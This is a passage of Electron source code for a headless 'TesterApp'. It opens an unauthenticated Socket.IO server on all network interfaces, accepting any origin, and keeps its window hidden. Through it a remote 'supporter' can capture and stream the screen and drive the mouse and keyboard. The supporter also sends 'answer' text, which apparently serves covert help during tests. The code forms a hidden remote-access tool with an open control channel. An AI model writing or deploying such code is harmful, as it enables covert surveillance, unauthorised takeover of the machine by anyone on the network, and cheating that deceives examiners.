      interfaces.forEach(iface => {
        if (iface.family === 'IPv4' && !iface.internal) {
        }
      });
    });
    
    // Get public IP address
    try {
      const https = require('https');
      const publicIP = await this.getPublicIP();
      if (publicIP) {
      }
    } catch (error) {
    }
    
  }

  getPublicIP() {
    return new Promise((resolve) => {
      const https = require('https');
      
      // Try multiple services for better reliability
      const services = [
        'https://api.ipify.org',
        'https://ipv4.icanhazip.com',
        'https://checkip.amazonaws.com'
      ];
      
      let currentService = 0;
      
      const tryService = () => {
        if (currentService >= services.length) {
          resolve(null);
          return;
        }
        
        const service = services[currentService];
        
        https.get(service, (res) => {
          let data = '';
          res.on('data', (chunk) => {
            data += chunk;
          });
          res.on('end', () => {
            const ip = data.trim();
            if (ip && /^\d+\.\d+\.\d+\.\d+$/.test(ip)) {
              resolve(ip);
            } else {
              currentService++;
              tryService();
            }
          });
        }).on('error', (error) => {
          currentService++;
          tryService();
        }).setTimeout(5000, () => {
          currentService++;
          tryService();
        });
      };
      
      tryService();
    });
  }

  tryAlternativePorts(originalPort, quality) {
    // Try common non-privileged ports
    const alternativePorts = [3001, 3002, 3003, 4000, 4001, 5000, 5001, 8000, 8001, 9000, 9001];
    
    const tryPort = (portIndex) => {
      if (portIndex >= alternativePorts.length) {
        console.error('❌ All alternative ports failed. Please run as administrator or check firewall settings.');
        return;
      }
      
      const port = alternativePorts[portIndex];
      
      // Create a new server instance for the alternative port
      const express = require('express');
      const http = require('http');
      const socketIo = require('socket.io');
      
      const expressApp = express();
      const altServer = http.createServer(expressApp);
      const altIo = socketIo(altServer, {
        cors: {
          origin: "*",
          methods: ["GET", "POST"]
        }
      });

      altServer.listen(port, '0.0.0.0', () => {
        // Server listening on all interfaces
        
        // Update the main server reference
        this.server = altServer;
        this.io = altIo;
        
        // Set up the same event handlers
        this.setupServerEventHandlers(altIo, quality);
        
        // Display connection information for alternative port
        this.displayConnectionInfo(port);
      });

      altServer.on('error', (error) => {
        tryPort(portIndex + 1);
      });
    };
    
    tryPort(0);
  }

  setupServerEventHandlers(io, quality) {
    io.on('connection', (socket) => {
      
      this.socket = socket;
      this.isConnected = true;
      this.screenQuality = quality; // Store quality setting
      // Don't auto-start screen sharing - wait for supporter to click View button
      
      // Connection established - no UI to notify
      
      // Handle supporter events
      this.handleSupporterEvents(socket);
      
      // Handle supporter disconnection
      socket.on('disconnect', () => {
        this.isConnected = false;
        this.stopScreenSharing();
        
        // Keep window hidden - user can access via tray icon if needed
      });
    });
  }

  // Handle supporter events
  handleSupporterEvents(socket) {
    // Handle screen sharing start/stop
    socket.on('start-screen-sharing', () => {
      if (!this.isSharing) {
      this.startScreenSharing();
        
        // Window already hidden by default - no need to hide again
      }
    });

    socket.on('stop-screen-sharing', () => {
      if (this.isSharing) {
      this.stopScreenSharing();
        
        // Keep window hidden - user can access via tray icon if needed
      }
    });

    socket.on('receiveData', (data) => {
      // If it's an answer, save the answer text and display it in chat
      if (data.type === 'answer') {
        this.tempData = data.data; // Save the actual answer text
        
      this.chatMessages.push({
        type: 'supporter',
          message: `📝 Answer: ${data.data}`,
        timestamp: new Date()
      });
      
      } else {
        // For other data types, save the entire data object
      this.tempData = data;
      }
    });

    socket.on('chatMessage', (message) => {
      this.chatMessages.push({
          type: 'supporter',
          message: message,
          timestamp: new Date()
        });
      
      // Message received - no UI to display
      
      // Chat is now integrated into main window - no separate chat window needed
    });

    socket.on('request-screenshot', async () => {
      try {
        // Take a fresh, full-quality screenshot (PNG format, no compression)
        const screenshot = require('screenshot-desktop');
        const img = await screenshot({ 
          format: 'png',     // PNG for lossless quality
          quality: 1.0,      // Maximum quality
          screen: 0,         // Primary screen
          cursor: true       // Capture mouse cursor
        });
        const base64Data = img.toString('base64');
        
        // Send the full-quality screenshot back to supporter
        socket.emit('screenshot-data', base64Data);
      } catch (error) {
        console.error('❌ Error capturing screenshot:', error);
      }
    });

    socket.on('request-area-screenshot', async (selectedArea) => {
      try {
        
        // Take a full screenshot first
        const screenshot = require('screenshot-desktop');
        const fullImg = await screenshot({ 
          format: 'png',     // PNG for lossless quality
          quality: 1.0,      // Maximum quality
          screen: 0,         // Primary screen
          cursor: true       // Capture mouse cursor
        });
        
        // Convert to base64 and extract the selected area
        const base64Data = fullImg.toString('base64');
        
        // Send the area screenshot data back to supporter
        socket.emit('area-screenshot-data', {
          base64Data: base64Data,
          area: selectedArea
        });
        
      } catch (error) {
        console.error('❌ Error capturing area screenshot:', error);
      }
    });

    socket.on('mouseMove', (data) => {
      if (this.isSharing) {
        this.moveMouse(data.x, data.y);
      }
    });

    socket.on('mouseClick', (data) => {
      if (this.isSharing) {
        this.clickMouse(data.x, data.y, data.button || 'left');
      }
    });

    socket.on('keyPress', (data) => {
      if (this.isSharing) {
        this.pressKey(data.key, data.modifiers);
      }
    });
  }

  async startScreenSharing() {
    this.isSharing = true;
    
    // App is headless - no window to hide
    
    // Mouse cursor is captured directly in screen images (cursor: true)
    
    // Set up screen capture based on quality setting
    await this.setupScreenCapture();
    
    // Send the locked screen resolution to supporter
    if (this.socket && this.initialScreenResolution) {
      this.socket.emit('screen-resolution', {
        width: this.initialScreenResolution.width,
        height: this.initialScreenResolution.height
      });
    }
    
    // Audio capture removed
    
  }

  async setupScreenCapture() {
    if (this.captureInterval) {
      clearInterval(this.captureInterval);
    }

    // Try to use Electron's efficient capture method first
    // Use only screenshot-desktop method for simplicity and reliability
    this.setupScreenshotCapture();
  }

  async setupElectronCapture() {
    
    try {
      // Get screen sources for WebRTC with multiple options
      const sources = await desktopCapturer.getSources({
        types: ['screen', 'window'],
        thumbnailSize: { width: 1920, height: 1080 },
        fetchWindowIcons: true
      });

      if (sources.length === 0) {
        throw new Error('No screen sources available');
      }

      // Get the primary screen (usually the first one)
      this.primaryScreen = sources.find(source => 
        source.name.includes('Screen') || source.name.includes('Display')
      ) || sources[0];
      

      // Set up WebRTC stream in renderer process
      await this.setupWebRTCStream();

      // Professional capture intervals (Zoom-like performance)
    const quality = this.screenQuality || 'medium';
    let interval;

    switch (quality) {
      case 'high':
        interval = 100; // 10 FPS (reduced to prevent freezing)
        break;
      case 'medium':
        interval = 50; // 20 FPS (balanced)
        break;
      case 'low':
        interval = 100; // 10 FPS (efficient)
        break;
      default:
        interval = 50;
    }

    // Add CPU monitoring and adaptive quality
    this.cpuUsage = 0;
    this.lastCaptureTime = 0;
    this.captureCount = 0;
    this.frameSkipCount = 0;
    this.maxFrameSkip = process.platform === 'win32' ? 2 : 1;

    this.captureInterval = setInterval(async () => {
      if (this.isSharing && this.socket) {
        try {
          // Skip capture only if our own capture is taking too long (not system CPU)
          // This prevents stopping capture due to other applications using CPU

          // Frame skipping for better performance
          this.frameSkipCount++;
          if (this.frameSkipCount < this.maxFrameSkip) {
            return; // Skip this frame
          }
          this.frameSkipCount = 0;

          const startTime = performance.now();
          
          // Use professional WebRTC capture
          const img = await this.captureScreenElectron();
          
          // Only send if we have a socket connection and screen sharing is active
          if (this.socket && this.socket.connected && this.isSharing) {
            this.socket.emit('screenData', {
              image: img,
              timestamp: Date.now(),
              quality: this.screenQuality
            });
          }

          // Professional performance monitoring
          const captureTime = performance.now() - startTime;
          this.captureCount++;
          
          // Log performance every 60 captures (Zoom-like monitoring)
          if (this.captureCount % 60 === 0) {
            const fps = Math.round(1000 / (Date.now() - this.lastCaptureTime) * 60);
            this.lastCaptureTime = Date.now();
          }

          // Adaptive quality adjustment (Zoom-like)
          if (captureTime > 50 || this.cpuUsage > 70) {
            this.adjustQualityForPerformance();
          }

        } catch (error) {
          console.error('Electron capture error:', error);
          // Fallback to screenshot-desktop
          this.useElectronCapture = false;
          this.setupScreenshotCapture();
        }
      }
    }, interval);

    // Start CPU monitoring
    this.startCpuMonitoring();
    
    } catch (error) {
      console.error('❌ Professional WebRTC setup failed:', error);
      throw error;
    }
  }

  async setupWebRTCStream() {
    return new Promise((resolve, reject) => {
      const timeout = setTimeout(() => {
        resolve(); // Don't reject, just resolve to use fallback
      }, 5000); // Reduced timeout to 5 seconds

      // Listen for WebRTC ready signal
      ipcMain.once('webrtc-ready', () => {
        clearTimeout(timeout);
        resolve();
      });

      // Listen for WebRTC error
      ipcMain.once('webrtc-error', (event, error) => {
        clearTimeout(timeout);
        resolve(); // Don't reject, just resolve to use fallback
      });

      // WebRTC setup - no UI to notify
      clearTimeout(timeout);
      resolve(); // Don't reject, just resolve to use fallback
    });
  }

  async captureScreenElectron() {
    // Request WebRTC capture from renderer process
    return new Promise((resolve, reject) => {
      const timeout = setTimeout(() => {
        // Clean up listener to prevent memory leaks
        ipcMain.removeAllListeners('webrtc-capture-result');
        reject(new Error('WebRTC capture timeout'));
      }, 2000); // Increased timeout

      // Listen for WebRTC capture result
      const handleCaptureResult = (event, result) => {
        clearTimeout(timeout);
        ipcMain.removeListener('webrtc-capture-result', handleCaptureResult);
        
        if (result.success) {
          resolve(result.imageData);
        } else {
          reject(new Error(result.error || 'WebRTC capture failed'));
        }
      };

      // Remove any existing listeners first to prevent memory leaks
      ipcMain.removeAllListeners('webrtc-capture-result');
      ipcMain.once('webrtc-capture-result', handleCaptureResult);
      
      // No UI to request capture from
      clearTimeout(timeout);
      reject(new Error('No UI available'));
    });
  }

  setupScreenshotCapture() {
    
    const quality = this.screenQuality || 'medium';
    let captureOptions, interval;

    // Get actual screen resolution and lock it
    const { screen } = require('electron');
    const primaryDisplay = screen.getPrimaryDisplay();
    const { width: screenWidth, height: screenHeight } = primaryDisplay.workAreaSize;
    
    // Store the initial screen resolution if not already stored
    if (!this.initialScreenResolution) {
      this.initialScreenResolution = { width: screenWidth, height: screenHeight };
      console.log(`🔒 Locked screen resolution to: ${screenWidth}x${screenHeight}`);
    }
    
    // Use the locked resolution instead of hardcoded values
    const lockedWidth = this.initialScreenResolution.width;
    const lockedHeight = this.initialScreenResolution.height;

    // Optimized settings for maximum image quality
    switch (quality) {
      case 'high':
        captureOptions = {
          format: 'jpeg',    // JPEG for better performance
          quality: 0.8,      // Good quality but not maximum
          screen: 0,
          width: 1920,       // Full HD resolution
          height: 1080,
          cursor: true       // Capture mouse cursor
        };
        interval = 100; // 10 FPS (reduced to prevent freezing)
        break;
      case 'medium':
        captureOptions = {
          format: 'jpeg',    // JPEG for better performance
          quality: 0.7,      // Good quality
          screen: 0,
          width: lockedWidth,
          height: lockedHeight,
          cursor: true       // Capture mouse cursor
        };
        interval = 100; // 10 FPS (reduced to prevent freezing)
        break;
      case 'low':
        captureOptions = {
          format: 'jpeg',    // JPEG for low quality mode only
          quality: 0.6,      // Lower quality for better performance
          screen: 0,
          width: lockedWidth,
          height: lockedHeight,
          cursor: true       // Capture mouse cursor
        };
        interval = 150; // ~7 FPS (very low to prevent freezing)
        break;
      default:
        captureOptions = {
          format: 'jpeg',    // JPEG for better performance
          quality: 0.7,      // Good quality
          screen: 0,
          width: lockedWidth,
          height: lockedHeight,
          cursor: true       // Capture mouse cursor
        };
        interval = 100; // Default to 10 FPS (reduced to prevent freezing)
    }

    // Add capture performance monitoring (not system CPU)
    this.cpuUsage = 0;
    this.lastCaptureTime = 0;
    this.captureCount = 0;
    this.frameSkipCount = 0;
    this.maxFrameSkip = 2; // Skip frames to prevent freezing
    this.slowCaptureCount = 0; // Count consecutive slow captures
    this.maxSlowCaptures = 5; // Adjust quality after 5 slow captures

    this.captureInterval = setInterval(async () => {
      if (this.isSharing && this.socket) {
        try {
          // Skip capture only if our own capture is taking too long (not system CPU)
          // This prevents stopping capture due to other applications using CPU

          // Frame skipping for better performance
          this.frameSkipCount++;
          if (this.frameSkipCount < this.maxFrameSkip) {
            return; // Skip this frame
          }
          this.frameSkipCount = 0;

          const startTime = Date.now();
          const img = await screenshot(captureOptions);
          
          // Mouse cursor is captured directly in screen images (cursor: true)
          
          // For high frame rates, send full frames more frequently for better quality
          const deltaInfo = await this.detectChangedRegions(img, captureOptions.width, captureOptions.height);
          
          // Only send if we have a socket connection and screen sharing is active
          if (this.socket && this.socket.connected && this.isSharing) {
            // Send full frame more frequently for high performance
            if (deltaInfo.isFullFrame || this.captureCount % 10 === 0) {
              // Send full frame
              this.socket.emit('screenData', {
                image: img.toString('base64'),
                isFullFrame: true,
                regions: deltaInfo.regions
              });
            } else if (deltaInfo.regions.length > 0) {
              // Send only changed regions
              const regionImages = [];
              for (const region of deltaInfo.regions) {
                // Extract region from full image
                const regionImg = this.extractRegion(img, region, captureOptions.width, captureOptions.height);
                regionImages.push({
                  x: region.x,
                  y: region.y,
                  width: region.width,
                  height: region.height,
                  image: regionImg.toString('base64')
                });
              }
              
              this.socket.emit('screenData', {
                regions: regionImages,
                isFullFrame: false,
                changedPixels: deltaInfo.changedPixels
              });
            }
            // If no changes detected, don't send anything
          }

          // Monitor capture performance
          const captureTime = Date.now() - startTime;
          this.captureCount++;
          
          // Log performance every 30 captures to reduce console spam
          if (this.captureCount % 30 === 0) {
          }

          // Adaptive quality adjustment based on capture performance only
          if (captureTime > 100) { // If capture takes more than 100ms (our app is struggling)
            this.slowCaptureCount++;
            if (this.slowCaptureCount >= this.maxSlowCaptures) {
              this.adjustQualityForPerformance();
              this.slowCaptureCount = 0; // Reset counter
            }
          } else {
            this.slowCaptureCount = 0; // Reset counter if capture is fast
          }

        } catch (error) {
          console.error('Screen capture error:', error);
        }
      }
    }, interval);

    // Start CPU monitoring
    this.startCpuMonitoring();
  }

  startCpuMonitoring() {
    if (this.cpuMonitorInterval) {
      clearInterval(this.cpuMonitorInterval);
    }

    this.cpuMonitorInterval = setInterval(() => {
      this.getCpuUsage().then(usage => {
        this.cpuUsage = usage;
      }).catch(error => {
        console.error('CPU monitoring error:', error);
      });
    }, 5000); // Check CPU every 5 seconds to reduce overhead
  }

  async getCpuUsage() {
    const { exec } = require('child_process');
    
    return new Promise((resolve) => {
      if (process.platform === 'win32') {
        // Windows: Use wmic to get CPU usage
        exec('wmic cpu get loadpercentage /value', (error, stdout) => {
          if (error) {
            resolve(0);
            return;
          }
          
          const match = stdout.match(/LoadPercentage=(\d+)/);
          if (match) {
            resolve(parseInt(match[1]));
          } else {
            resolve(0);
          }
        });
      } else {
        // Linux/Mac: Use top command
        exec("top -bn1 | grep 'Cpu(s)' | awk '{print $2}' | awk -F'%' '{print $1}'", (error, stdout) => {
          if (error) {
            resolve(0);
            return;
          }
          
          const usage = parseFloat(stdout.trim());
          resolve(isNaN(usage) ? 0 : usage);
        });
      }
    });
  }

  async adjustQualityForPerformance() {
    const now = Date.now();
    // Only adjust quality once every 10 seconds to prevent spam
    if (now - this.lastQualityAdjustment < 10000) {
      return;
    }
    this.lastQualityAdjustment = now;
    
    
    // Very conservative quality reduction for high performance
    if (this.screenQuality === 'high') {
      // Only reduce to medium if CPU is extremely high
      if (this.cpuUsage > 90) {
        this.screenQuality = 'medium';
       
        this.restartCapture();
      } else {
        // Just increase frame skipping slightly
        this.maxFrameSkip = Math.min(this.maxFrameSkip + 1, 1);
       
      }
    } else if (this.screenQuality === 'medium') {
      // Only reduce to low if CPU is extremely high
      if (this.cpuUsage > 90) {
        this.screenQuality = 'low';
       
        this.restartCapture();
      } else {
        this.maxFrameSkip = Math.min(this.maxFrameSkip + 1, 2);
       
      }
    } else if (this.screenQuality === 'low') {
      // If already at low quality, increase frame skipping more conservatively
      this.maxFrameSkip = Math.min(this.maxFrameSkip + 1, 3);
     
    }
    
  }

  restartCapture() {
    // Stop current capture
    if (this.captureInterval) {
      clearInterval(this.captureInterval);
      this.captureInterval = null;
    }
    
    // Restart with new settings
    setTimeout(() => {
      // Always use screenshot method for simplicity
      this.setupScreenshotCapture();
    }, 1000); // Wait 1 second before restarting
  }

  // Load pixelmatch dynamically
  async loadPixelmatch() {
    if (!this.pixelmatch) {
      try {
        const pixelmatchModule = await import('pixelmatch');
        this.pixelmatch = pixelmatchModule.default;

      } catch (error) {
       
        this.pixelmatch = null;
      }
    }
    return this.pixelmatch;
  }

  // Simple delta compression fallback (without pixelmatch)
  simpleDeltaCompression(currentBuffer, width, height) {
    if (!this.lastScreenBuffer || 
        this.lastScreenWidth !== width || 
        this.lastScreenHeight !== height) {
      // First frame or resolution changed - send full screen
      this.lastScreenBuffer = Buffer.from(currentBuffer);
      this.lastScreenWidth = width;
      this.lastScreenHeight = height;
      return {
        isFullFrame: true,
        regions: [{ x: 0, y: 0, width, height }]
      };
    }

    // Simple hash-based comparison for JPEG/PNG data
    const currentHash = this.simpleHash(currentBuffer);
    const lastHash = this.simpleHash(this.lastScreenBuffer);
    
    // If hashes are the same, no changes
    if (currentHash === lastHash) {
      return {
        isFullFrame: false,
        regions: [],
        changedPixels: 0
      };
    }

    // Images are different, send full frame
    this.lastScreenBuffer = Buffer.from(currentBuffer);
    return {
      isFullFrame: true,
      regions: [{ x: 0, y: 0, width, height }]
    };
  }

  // Simple hash function for image comparison
  simpleHash(buffer) {
    let hash = 0;
    const sampleSize = Math.min(buffer.length, 10000); // Sample first 10KB
    const step = Math.floor(buffer.length / sampleSize);
    
    for (let i = 0; i < buffer.length; i += step) {
      hash = ((hash << 5) - hash + buffer[i]) & 0xffffffff;
    }
    
    return hash;
  }

  // Delta compression: detect changed regions (simplified approach)
  async detectChangedRegions(currentBuffer, width, height) {
    if (!this.lastScreenBuffer || 
        this.lastScreenWidth !== width || 
        this.lastScreenHeight !== height) {
      // First frame or resolution changed - send full screen
      this.lastScreenBuffer = Buffer.from(currentBuffer);
      this.lastScreenWidth = width;
      this.lastScreenHeight = height;
      return {
        isFullFrame: true,
        regions: [{ x: 0, y: 0, width, height }]
      };
    }

    // Use simple delta compression for now (more reliable)
    return this.simpleDeltaCompression(currentBuffer, width, height);
  }

  // Find rectangular regions that contain changes
  findChangedRegions(diffBuffer, width, height) {
    const regions = [];
    const visited = new Array(width * height).fill(false);
    
    for (let y = 0; y < height; y++) {
      for (let x = 0; x < width; x++) {
        const index = (y * width + x) * 4;
        const pixelIndex = y * width + x;
        
        // Check if pixel changed (red channel > 0)
        if (diffBuffer[index] > 0 && !visited[pixelIndex]) {
          const region = this.floodFill(diffBuffer, visited, x, y, width, height);
          if (region.width > 0 && region.height > 0) {
            regions.push(region);
          }
        }
      }
    }
    
    return regions;
  }

  // Flood fill algorithm to find connected changed regions
  floodFill(diffBuffer, visited, startX, startY, width, height) {
    const stack = [{ x: startX, y: startY }];
    let minX = startX, maxX = startX, minY = startY, maxY = startY;
    
    while (stack.length > 0) {
      const { x, y } = stack.pop();
      const index = (y * width + x) * 4;
      const pixelIndex = y * width + x;
      
      if (x < 0 || x >= width || y < 0 || y >= height || 
          visited[pixelIndex] || diffBuffer[index] === 0) {
        continue;
      }
      
      visited[pixelIndex] = true;
      minX = Math.min(minX, x);
      maxX = Math.max(maxX, x);
      minY = Math.min(minY, y);
      maxY = Math.max(maxY, y);
      
      // Add neighbors to stack
      stack.push(
        { x: x + 1, y },
        { x: x - 1, y },
        { x, y: y + 1 },
        { x, y: y - 1 }
      );
    }
    
    return {
      x: minX,
      y: minY,
      width: maxX - minX + 1,
      height: maxY - minY + 1
    };
  }

  // Extract a region from the full screen image (simplified version)
  extractRegion(fullImageBuffer, region, screenWidth, screenHeight) {
    // For now, return the full image buffer
    // TODO: Implement proper region extraction with canvas
    return fullImageBuffer;
  }

  stopScreenSharing() {
    this.isSharing = false;
    
    // Mouse cursor captured directly in screen images
    
    if (this.captureInterval) {
      clearInterval(this.captureInterval);
      this.captureInterval = null;
    }
    
    // Stop CPU monitoring
    if (this.cpuMonitorInterval) {
      clearInterval(this.cpuMonitorInterval);
      this.cpuMonitorInterval = null;
    }
    
    // Audio capture removed
    
    // App is headless - no window to restore
    
  }

  // Removed playNotificationSound - no notifications needed

  // Audio setup removed

  // Audio capture removed

  // Windows audio capture removed

  // All audio methods removed

  delay(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
  }

  setupIpcHandlers() {
    // Server auto-starts, no manual start/stop needed

    ipcMain.on('change-quality', async (event, quality) => {
      this.screenQuality = quality;
      if (this.isSharing) {
        await this.setupScreenCapture();
      }
    });

    ipcMain.handle('send-chat-message', (event, message) => {
      if (this.socket && this.isConnected) {
        this.socket.emit('chatMessage', message);
        
        // Add to local chat messages
        this.chatMessages.push({
          type: 'tester',
          message: message,
          timestamp: new Date()
        });
        
        return true;
      }
      return false;
    });

    ipcMain.on('save-settings', (event, settings) => {
      // Save settings to localStorage or file
      localStorage.setItem('tester-settings', JSON.stringify(settings));
      event.reply('settings-saved', true);
    });

    ipcMain.on('get-audio-devices', (event) => {
      // Return available audio devices
      event.reply('audio-devices', {
        input: [], // Will be populated with actual devices
        output: []
      });
    });

    ipcMain.on('test-audio-device', (event, { type, device }) => {
      // Test audio device
    });

    ipcMain.on('get-chat-messages', (event) => {
      event.reply('chat-messages', this.chatMessages);
    });

    ipcMain.handle('toggle-audio', (event) => {
      return this.toggleAudio();
    });

    ipcMain.handle('get-audio-status', (event) => {
      return this.isAudioEnabled;
    });

    ipcMain.handle('capture-screen', async (event) => {
      try {
        
        // Take a high-quality screenshot
        const screenshot = require('screenshot-desktop');
        const img = await screenshot({ 
          format: 'png',     // PNG for lossless quality
          quality: 1.0,      // Maximum quality
          screen: 0,         // Primary screen
          cursor: true       // Capture mouse cursor
        });
        
        const base64Data = img.toString('base64');
        
        // Send the captured image data to the renderer
        event.reply('screen-captured', base64Data);
        
        return { success: true };
      } catch (error) {
        console.error('❌ Error capturing screen:', error);
        return { success: false, error: error.message };
      }
    });

    ipcMain.handle('capture-area', async (event, selectedArea) => {
      try {
        
        // Take a high-quality screenshot
        const screenshot = require('screenshot-desktop');
        const fullImg = await screenshot({ 
          format: 'png',     // PNG for lossless quality
          quality: 1.0,      // Maximum quality
          screen: 0,         // Primary screen
          cursor: true       // Capture mouse cursor
        });
        
        // For now, we'll send the full image with area coordinates
        // The supporter can crop it if needed, or we can implement cropping here
        const base64Data = fullImg.toString('base64');
        
        // Send the captured image data with area info to the renderer
        event.reply('screen-captured', base64Data);
        
        return { success: true };
      } catch (error) {
        console.error('❌ Error capturing area:', error);
        return { success: false, error: error.message };
      }
    });

    ipcMain.handle('send-captured-image', (event, imageData) => {
      try {
        if (!this.socket || !this.isConnected) {
          return { success: false, error: 'Not connected to supporter' };
        }
        
        
        // Send the captured image to the supporter
        this.socket.emit('captured-image', {
          imageData: imageData,
          timestamp: Date.now()
        });
        
        // Notify the renderer that image was sent
        event.reply('image-sent', { success: true });

        return { success: true };
      } catch (error) {
        console.error('❌ Error sending captured image:', error);
        event.reply('image-sent', { success: false, error: error.message });
        return { success: false, error: error.message };
      }
    });
  }
}

new TesterApp();